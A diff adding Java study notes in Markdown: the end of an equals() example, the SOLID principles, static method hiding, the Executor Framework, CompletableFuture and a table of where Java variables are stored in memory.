+        if (o == null) return false;    // null check
+        if (getClass() != o.getClass()) return false;
+
+        Student s = (Student) o;
+
+        return id == s.id &&
+               Objects.equals(name, s.name);
+    }
+}
+```
+
+# SOLID Principles
+
+SOLID is a set of five object-oriented design principles that help make software
+more maintainable, flexible, and scalable.
+
+---
+
+## S — Single Responsibility Principle (SRP)
+
+**Definition:**  
+A class should have only one reason to change.
+
+**Explanation:**  
+Each class should focus on a single responsibility or job. If a class handles
+multiple responsibilities, changes in one area may affect others.
+
+**Benefits:**
+- Easier to understand
+- Easier to maintain
+- Reduced risk of bugs
+
+---
+
+## O — Open/Closed Principle (OCP)
+
+**Definition:**  
+Software entities should be open for extension but closed for modification.
+
+**Explanation:**  
+You should be able to add new functionality without changing existing code.
+This is usually achieved using inheritance, interfaces, or composition.
+
+**Benefits:**
+- Reduces risk of breaking existing code
+- Encourages reusable and scalable designs
+
+---
+
+## L — Liskov Substitution Principle (LSP)
+
+**Definition:**  
+Subtypes must be substitutable for their base types without affecting correctness.
+
+**Explanation:**  
+Objects of a superclass should be replaceable with objects of its subclasses
+without breaking the application.
+
+**Benefits:**
+- Ensures reliable inheritance
+- Prevents unexpected runtime behavior
+
+---
+
+## I — Interface Segregation Principle (ISP)
+
+**Definition:**  
+Clients should not be forced to depend on interfaces they do not use.
+
+**Explanation:**  
+Instead of one large interface, create smaller, more specific interfaces so
+classes only implement what they actually need.
+
+**Benefits:**
+- Reduces unnecessary dependencies
+- Improves code clarity and flexibility
+
+---
+
+## D — Dependency Inversion Principle (DIP)
+
+**Definition:**  
+High-level modules should not depend on low-level modules.  
+Both should depend on abstractions.
+
+**Explanation:**  
+Depend on interfaces or abstract classes rather than concrete implementations.
+Details should depend on abstractions, not the other way around.
+
+**Benefits:**
+- Loose coupling
+- Easier testing
+- Easier to replace implementations
+
+---
+
+## Summary
+
+| Principle | Focus |
+|---------|-------|
+| SRP | One responsibility per class |
+| OCP | Extend behavior without modifying code |
+| LSP | Correct inheritance and substitution |
+| ISP | Small, focused interfaces |
+| DIP | Depend on abstractions, not implementations |
+
+---
+
+### Method Hiding
+
+Method hiding occurs when a subclass defines a static method with the same signature as a static method in the parent class or interface. Static methods are resolved at compile time, so polymorphism does not apply.
+
+```
+interface Payment {
+
+    static void info() {
+        System.out.println("Payment interface static method");
+    }
+}
+
+class UpiPayment implements Payment {
+
+    static void info() {
+        System.out.println("UPI info");
+    }
+}
+
+public class PaymentTest {
+    public static void main(String[] args) {
+
+        Payment.info();       // Payment version
+        UpiPayment.info();    // UpiPayment version
+        // correct way
+    }
+}
+
+```
+
+
+### ✅ Executor Framework
+
+The Executor Framework is a Java API that manages thread creation, reuse, and execution using thread pools, so developers don’t have to handle threads manually.
+
+### CompletableFuture 
+
+CompletableFuture is a Java class used to run asynchronous, non-blocking tasks and to chain, combine, and handle the results of those tasks in a clean and flexible way.
+
+**CompletableFuture = async task + result + chaining**
+
+
+#### | Variable Type                   | Stored In                              |
+| ------------------------------- | -------------------------------------- |
+| Local variable                  | Stack                                  |
+| Instance variable               | Heap                                   |
+| `static` variable               | Method Area (Metaspace)                |
+| `final` local variable          | Stack                                  |
+| `final` instance variable       | Heap                                   |
+| `static final` variable         | Method Area                            |
+| `static final` reference object | Heap (object), Method Area (reference) |
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
